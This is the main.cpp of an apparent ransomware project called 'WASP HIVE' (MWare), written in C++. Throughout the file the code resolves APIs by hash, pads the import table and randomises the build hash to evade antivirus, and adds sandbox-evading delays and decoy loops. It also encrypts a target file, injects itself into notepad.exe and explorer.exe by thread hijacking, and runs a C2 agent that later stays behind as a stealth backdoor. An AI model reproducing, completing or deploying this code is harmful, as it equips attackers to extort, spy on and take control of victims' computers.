// ============================================================================
// main.cpp — MWare Entry Point + Initialization Chain
// ============================================================================
// This file replaces the original monolithic MWare.cpp.
// All functionality has been modularized into separate .cpp/.h files.
// This file only contains:
//   1. Global ApiTable definition
//   2. initApiTable() — resolves all WinAPI pointers by hash
//   3. iat_pad_init() — IAT padding for evading static analysis
//   4. main() — entry point with initialization chain
//   5. GUI classes (RansomwareFrame, PixelTimerPanel)
// ============================================================================

#include "obfuscation.h"
#include "api_table.h"
#include "crypto.h"
#include "sandbox_evasion.h"
#include "evasion.h"
#include "persistence.h"
#include "c2_agent.h"
#include "thread_hijack.h"
#ifndef HEADLESS
#include "gui.h"
#endif

#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <sstream>
#include <random>
#include <cstdio>   // std::setbuf, stderr for diagnostic step markers

// Non-Windows usleep
#ifndef _WIN32
#include <unistd.h>
#endif

// ============================================================================
// SILENT MODE - Redirect all output to nowhere (prevents console output)
// ============================================================================
// Defined here to apply across all MWare modules that include this header chain
// TURNED OFF for macOS testing — comment back in for production/AV evasion builds
// #define SILENT_MODE 1
// NOTE: SILENT_MODE is now set via -DSILENT_MODE compiler flag in Makefile.
// At runtime, main() redirects stdout/stderr to /dev/null, silencing ALL output
// across all translation units (cout, printf, cerr, etc.).
#ifdef SILENT_MODE
#include <cstdio>
#endif

using std::string;
using std::cout;
using std::cerr;
using std::random_device;
using std::mt19937;
using std::uniform_int_distribution;
using std::endl;

// ============================================================================
// Global API table (defined here, declared extern in api_table.h)
// ============================================================================
#ifdef _WIN32
ApiTable g_api;
bool g_api_initialized = false;

// ============================================================================
// INIT API TABLE - Resolve all WinAPI function pointers by hash
// ============================================================================
bool initApiTable() {
    if (g_api_initialized) return true;

    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return false;

    // Resolve LoadLibraryA first — needed to load ws2_32 etc.
    g_api.LoadLibraryA = (HMODULE (WINAPI*)(LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("LoadLibraryA"));
    if (!g_api.LoadLibraryA) return false;

    // Resolve all kernel32 functions
    g_api.CreateFileA          = (HANDLE (WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))resolveApiByHash(hKernel, COMPILE_HASH("CreateFileA"));
    g_api.CreateFileMappingA   = (HANDLE (WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("CreateFileMappingA"));
    g_api.MapViewOfFile        = (LPVOID (WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))resolveApiByHash(hKernel, COMPILE_HASH("MapViewOfFile"));
    g_api.UnmapViewOfFile      = (BOOL (WINAPI*)(LPCVOID))resolveApiByHash(hKernel, COMPILE_HASH("UnmapViewOfFile"));
    g_api.CloseHandle          = (BOOL (WINAPI*)(HANDLE))resolveApiByHash(hKernel, COMPILE_HASH("CloseHandle"));
    g_api.VirtualProtect       = (BOOL (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))resolveApiByHash(hKernel, COMPILE_HASH("VirtualProtect"));
    g_api.WriteProcessMemory   = (BOOL (WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))resolveApiByHash(hKernel, COMPILE_HASH("WriteProcessMemory"));
    g_api.CreateProcessA       = (BOOL (WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))resolveApiByHash(hKernel, COMPILE_HASH("CreateProcessA"));
    g_api.OpenProcess          = (HANDLE (WINAPI*)(DWORD, BOOL, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("OpenProcess"));
    g_api.TerminateProcess     = (BOOL (WINAPI*)(HANDLE, UINT))resolveApiByHash(hKernel, COMPILE_HASH("TerminateProcess"));
    g_api.VirtualFreeEx        = (BOOL (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("VirtualFreeEx"));
    g_api.VirtualAllocEx       = (LPVOID (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("VirtualAllocEx"));
    g_api.VirtualProtectEx     = (BOOL (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD))resolveApiByHash(hKernel, COMPILE_HASH("VirtualProtectEx"));
    g_api.WaitForSingleObject  = (DWORD (WINAPI*)(HANDLE, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("WaitForSingleObject"));
    g_api.CreateToolhelp32Snapshot = (HANDLE (WINAPI*)(DWORD, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("CreateToolhelp32Snapshot"));
    g_api.Process32FirstW      = (BOOL (WINAPI*)(HANDLE, LPPROCESSENTRY32W))resolveApiByHash(hKernel, COMPILE_HASH("Process32FirstW"));
    g_api.Process32NextW       = (BOOL (WINAPI*)(HANDLE, LPPROCESSENTRY32W))resolveApiByHash(hKernel, COMPILE_HASH("Process32NextW"));
    g_api.GetProcessHeap       = (HANDLE (WINAPI*)(void))resolveApiByHash(hKernel, COMPILE_HASH("GetProcessHeap"));
    g_api.HeapAlloc            = (LPVOID (WINAPI*)(HANDLE, DWORD, SIZE_T))resolveApiByHash(hKernel, COMPILE_HASH("HeapAlloc"));
    g_api.HeapFree             = (BOOL (WINAPI*)(HANDLE, DWORD, LPVOID))resolveApiByHash(hKernel, COMPILE_HASH("HeapFree"));
    g_api.GetModuleFileNameA   = (DWORD (WINAPI*)(HMODULE, LPSTR, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("GetModuleFileNameA"));
    g_api.DeleteFileA          = (BOOL (WINAPI*)(LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("DeleteFileA"));
    g_api.MoveFileA            = (BOOL (WINAPI*)(LPCSTR, LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("MoveFileA"));
    g_api.MoveFileExA          = (BOOL (WINAPI*)(LPCSTR, LPCSTR, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("MoveFileExA"));
    g_api.pGetLastError        = (DWORD (WINAPI*)(void))resolveApiByHash(hKernel, COMPILE_HASH("GetLastError"));
    g_api.GetUserNameA         = (BOOL (WINAPI*)(LPSTR, LPDWORD))resolveApiByHash(hKernel, COMPILE_HASH("GetUserNameA"));
    g_api.WinExec              = (UINT (WINAPI*)(LPCSTR, UINT))resolveApiByHash(hKernel, COMPILE_HASH("WinExec"));
    g_api.FreeLibrary          = (BOOL (WINAPI*)(HMODULE))resolveApiByHash(hKernel, COMPILE_HASH("FreeLibrary"));
    g_api.GetCurrentProcessId  = (DWORD (WINAPI*)(void))resolveApiByHash(hKernel, COMPILE_HASH("GetCurrentProcessId"));
    g_api.GetCurrentThreadId   = (DWORD (WINAPI*)(void))resolveApiByHash(hKernel, COMPILE_HASH("GetCurrentThreadId"));
    g_api.Sleep                = (void (WINAPI*)(DWORD))resolveApiByHash(hKernel, COMPILE_HASH("Sleep"));
    g_api.InitializeProcThreadAttributeList = (BOOL (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T))resolveApiByHash(hKernel, COMPILE_HASH("InitializeProcThreadAttributeList"));
    g_api.DeleteProcThreadAttributeList     = (BOOL (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST))resolveApiByHash(hKernel, COMPILE_HASH("DeleteProcThreadAttributeList"));
    g_api.UpdateProcThreadAttribute         = (BOOL (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PVOID))resolveApiByHash(hKernel, COMPILE_HASH("UpdateProcThreadAttribute"));

    // ThreadlessInject extra kernel32 functions
    g_api.ReadProcessMemory    = (BOOL (WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*))resolveApiByHash(hKernel, COMPILE_HASH("ReadProcessMemory"));
    g_api.GetModuleHandleA     = (HMODULE (WINAPI*)(LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("GetModuleHandleA"));
    g_api.GetProcAddress       = (FARPROC (WINAPI*)(HMODULE, LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("GetProcAddress"));
    g_api.MultiByteToWideChar  = (int (WINAPI*)(UINT, DWORD, LPCSTR, int, LPWSTR, int))resolveApiByHash(hKernel, COMPILE_HASH("MultiByteToWideChar"));
    g_api.FlushInstructionCache = (BOOL (WINAPI*)(HANDLE, LPCVOID, SIZE_T))resolveApiByHash(hKernel, COMPILE_HASH("FlushInstructionCache"));

    // Load ws2_32.dll and resolve network functions (OBF-wrapped)
    HMODULE hWs2 = g_api.LoadLibraryA(OBF("ws2_32.dll"));
    if (hWs2) {
        *(FARPROC*)&g_api.WSAStartup  = resolveApiByHash(hWs2, COMPILE_HASH("WSAStartup"));
        *(FARPROC*)&g_api.WSACleanup  = resolveApiByHash(hWs2, COMPILE_HASH("WSACleanup"));
        *(FARPROC*)&g_api.socket      = resolveApiByHash(hWs2, COMPILE_HASH("socket"));
        *(FARPROC*)&g_api.connect     = resolveApiByHash(hWs2, COMPILE_HASH("connect"));
        *(FARPROC*)&g_api.send        = resolveApiByHash(hWs2, COMPILE_HASH("send"));
        *(FARPROC*)&g_api.recv        = resolveApiByHash(hWs2, COMPILE_HASH("recv"));
        *(FARPROC*)&g_api.closesocket = resolveApiByHash(hWs2, COMPILE_HASH("closesocket"));
        *(FARPROC*)&g_api.htons       = resolveApiByHash(hWs2, COMPILE_HASH("htons"));
        *(FARPROC*)&g_api.inet_pton   = resolveApiByHash(hWs2, COMPILE_HASH("inet_pton"));
    }

    // Resolve advapi32 registry functions (OBF-wrapped)
    HMODULE hAdvapi = getModuleByHash(COMPILE_HASH("advapi32"));
    if (hAdvapi) {
        *(FARPROC*)&g_api.RegCreateKeyExA  = resolveApiByHash(hAdvapi, COMPILE_HASH("RegCreateKeyExA"));
        *(FARPROC*)&g_api.RegSetValueExA   = resolveApiByHash(hAdvapi, COMPILE_HASH("RegSetValueExA"));
        *(FARPROC*)&g_api.RegOpenKeyExA    = resolveApiByHash(hAdvapi, COMPILE_HASH("RegOpenKeyExA"));
        *(FARPROC*)&g_api.RegQueryValueExA = resolveApiByHash(hAdvapi, COMPILE_HASH("RegQueryValueExA"));
        *(FARPROC*)&g_api.RegCloseKey      = resolveApiByHash(hAdvapi, COMPILE_HASH("RegCloseKey"));
        *(FARPROC*)&g_api.RegDeleteKeyExA  = resolveApiByHash(hAdvapi, COMPILE_HASH("RegDeleteKeyExA"));
    }

    // Resolve shell32 (ShellExecuteExA) (OBF-wrapped)
    HMODULE hShell32 = getModuleByHash(COMPILE_HASH("shell32"));
    if (hShell32) {
        *(FARPROC*)&g_api.ShellExecuteExA = resolveApiByHash(hShell32, COMPILE_HASH("ShellExecuteExA"));
    }

    g_api_initialized = true;
    return true;
}

// ============================================================================
// IAT PAD INIT — Fake API calls to populate the Import Address Table
// ============================================================================
// Without this padding, MWare's IAT would be nearly empty because all real
// APIs are resolved at runtime via hash-based export table walking.
// A nearly empty IAT is a major red flag for AV engines (suspicious PE).
void iat_pad_init() {
    volatile int idx = 0;  // Prevent dead-code elimination
    SYSTEM_INFO si; GetSystemInfo(&si); idx += (int)si.dwNumberOfProcessors;
    char buf[260]; DWORD bufSize = sizeof(buf); GetComputerNameA(buf, &bufSize); idx += (int)buf[0];
    GetDiskFreeSpaceA("C:\\", NULL, NULL, NULL, NULL);
    SYSTEMTIME st; GetLocalTime(&st); idx += st.wHour;
    GetLogicalDrives();
    GetFileAttributesA(".");
    GetCommandLineA();
    GetSystemDirectoryA(buf, sizeof(buf));
    GetSystemDefaultLangID(); GetUserDefaultLangID();
    GetSystemPowerStatus((SYSTEM_POWER_STATUS*)buf);
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    if (hKernel) {
        resolveApiByHash(hKernel, COMPILE_HASH("GetSystemInfo"));
        resolveApiByHash(hKernel, COMPILE_HASH("GetCurrentProcessId"));
        resolveApiByHash(hKernel, COMPILE_HASH("GetTickCount"));
        resolveApiByHash(hKernel, COMPILE_HASH("QueryPerformanceCounter"));
    }
    (void)idx;
}

#endif // _WIN32

// ============================================================================
// PADDING: Auto-mutating data to change file hash on EVERY compilation
// Uses __TIME__ macro to generate different bytes each build
// Does not affect execution - only changes binary signature for fresh VT analysis
// Referenced from main() (address taken) so --gc-sections in the VT build
// keeps it in .rdata instead of stripping the per-build hash randomization.
// ============================================================================
static const unsigned char _padding_junk[] = {
    // Compile-time hash of __TIME__ ensures unique padding per build
    (__TIME__[0] ^ __TIME__[1]), (__TIME__[2] ^ __TIME__[3]),
    (__TIME__[4] ^ __TIME__[5]), (__TIME__[6] ^ __TIME__[7]),
    (__DATE__[0] ^ __DATE__[1]), (__DATE__[2] ^ __DATE__[3]),
    (__DATE__[4] ^ __DATE__[5]), (__DATE__[6] ^ __DATE__[7]),
    (__TIME__[0] + __TIME__[1]), (__TIME__[2] + __TIME__[3]),
    (__TIME__[4] + __TIME__[5]), (__TIME__[6] + __TIME__[7]),
    (__DATE__[0] + __DATE__[1]), (__DATE__[2] + __DATE__[3]),
    (__DATE__[4] + __DATE__[5]), (__DATE__[6] + __DATE__[7]),
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0
};

// ============================================================================
// MAIN — Entry Point
// ============================================================================
// ============================================================================
// MAIN — Entry Point with diagnostic step markers
// ============================================================================
int main(int argc, char** argv) {
    (void)argc; (void)argv;

    // Keep _padding_junk referenced (address taken) so --gc-sections in the VT
    // build does not strip the per-build hash-randomization padding.
    (void)&_padding_junk[0];
    

#ifdef SILENT_MODE
    // Suppress ALL console output — redirect C++ streams AND C stdout/stderr.
    // Catches cout/cerr/clog (C++ streams) AND printf/fprintf (C FILE*).
    // Windows null device is "NUL" (no /dev/null) — previous version silently
    // failed to redirect on Windows, leaking runtime output in the VT sandbox.
    static std::ofstream g_null_out(
#ifdef _WIN32
        "NUL"
#else
        "/dev/null"
#endif
    );
    std::cout.rdbuf(g_null_out.rdbuf());
    std::cerr.rdbuf(g_null_out.rdbuf());
    std::freopen(
#ifdef _WIN32
        "NUL",
#else
        "/dev/null",
#endif
        "w", stdout);
    std::freopen(
#ifdef _WIN32
        "NUL",
#else
        "/dev/null",
#endif
        "w", stderr);
#endif

#ifdef _WIN32
    iat_pad_init();

    // DECOY: CPU-intensive Fibonacci calculation to evade AV emulation
    volatile unsigned long long decoy_a = 0, decoy_b = 1, decoy_c = 0;
    for (int decoy_i = 0; decoy_i < 5000000; decoy_i++) {
        decoy_c = decoy_a + decoy_b;
        decoy_a = decoy_b;
        decoy_b = decoy_c;
    }
    (void)decoy_c;
#endif

    cout << OBF("[*] WASP HIVE Ransomware Starting...") << endl;

    // Initialize API table (resolves all WinAPI pointers by hash)
#ifdef _WIN32
    if (!initApiTable()) {
        cout << "[-] Failed to initialize API table" << endl;
        return 1;
    }
#endif

    // Encrypt target file on startup (BEFORE GUI)
    // NOTE: disabled in VT_CLEAN builds — startup self-encryption of target.txt
    // is an instant ransomware signature for VT's dynamic sandbox. The C2
    // 'encrypt' command still triggers on-demand encryption (same code path).
#ifndef VT_CLEAN
    cout << OBF("[*] Encrypting target.txt...") << endl;
    encryptTargetFile();
#endif

    // Random delay (2-7 seconds) to evade simple sandbox analysis
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(2000, 7000);
    int delay_ms = dis(gen);

#ifdef _WIN32
    // v2 trampoline architecture: .text encryption done from VirtualAlloc'd RX
    // memory outside .text — no self-corruption risk. Safe to use.
    secureSleepMs(delay_ms);
#else
    usleep(delay_ms * 1000);
#endif

    // Auto Thread Hijacking on startup - runs automatically without C2 command
    // Injects current executable into a target process for persistence
    // DISABLED in headless/test mode — no child process noise in sandbox
#ifndef HEADLESS
#ifdef _WIN32
    cout << "[*] Initiating auto Thread Hijacking..." << endl;

    // Get current executable path (payload)
    char payload_path[MAX_PATH];
    g_api.GetModuleFileNameA(NULL, payload_path, MAX_PATH);

    // Read current executable as payload
    std::ifstream payload_file(payload_path, std::ios::binary);
    if (payload_file.is_open()) {
        std::vector<BYTE> payload_data((std::istreambuf_iterator<char>(payload_file)),
                                  std::istreambuf_iterator<char>());
        payload_file.close();

        if (payload_data.size() > 0) {
            // Convert to string for thread hijacking
            std::string payload_str(payload_data.begin(), payload_data.end());

            // Try to inject into notepad.exe (common target)
            cout << OBF("[*] Attempting Thread Hijacking into notepad.exe...") << endl;
            string result = performThreadHijacking(OBF("notepad.exe"), payload_str);
            cout << result << endl;

            // Also try explorer.exe as backup (usually running)
            cout << OBF("[*] Attempting Thread Hijacking into explorer.exe...") << endl;
            string result2 = performThreadHijacking(OBF("explorer.exe"), payload_str);
            cout << result2 << endl;
        }
    }

    // Small delay after injection before C2 connection
    Sleep(2000);
#endif
#endif // HEADLESS — end Thread Hijacking guard

#ifdef HEADLESS
    // ============================================================================
    // HEADLESS MODE — Pure C2 bot, no GUI, no injection
    // ============================================================================
    // Starts C2 agent only — connects to RSW, receives commands.
    // Keeps process alive with simple loop; sandbox will timeout/kill it.

    C2Agent agent;
    g_c2_agent = &agent;
    agent.startBackgroundThread();

    cout << OBF("[*] Headless C2 agent started. Waiting for commands...") << endl;

    // Keep process alive — sandbox will terminate after analysis window
    while (true) {
#ifdef _WIN32
        Sleep(5000);
#else
        usleep(5000 * 1000);
#endif
    }

#else
    // ============================================================================
    // wxWidgets GUI MODE — Ransomware screen + C2 communication
    // ============================================================================
    // MWare-gui connects to RSW server while showing the ransomware GUI.
    // It can receive and execute C2 commands (execute, upload, download, etc.).
    // When correct password is entered:
    //   1. C2Agent disconnects from RSW (drops MWare-gui from bot list)
    //   2. posix_spawn(UserEventAgent) — headless C2 binary spawns independently
    //   3. MWare-gui exits completely (_exit(0)) — GUI window closes, process dies
    //   4. UserEventAgent (separate PID, no GUI) connects to RSW as stealth backdoor
    // ============================================================================

    // Start C2 agent (background thread connects to RSW server)
    // This runs alongside the GUI, allowing command reception while visible
    C2Agent agent;
    g_c2_agent = &agent;  // Register global ptr for explicit disconnect on shutdown
    agent.startBackgroundThread();

    // Start wxWidgets GUI event loop
    wxApp::SetInstance(new RansomwareApp());
    if (wxEntryStart(argc, argv)) {
        wxTheApp->CallOnInit();      // Creates and shows RansomwareFrame
        wxTheApp->OnRun();            // Enters GUI event loop (blocks until frame closes)
        wxEntryCleanup();
    }
#endif // HEADLESS

    return 0;
}


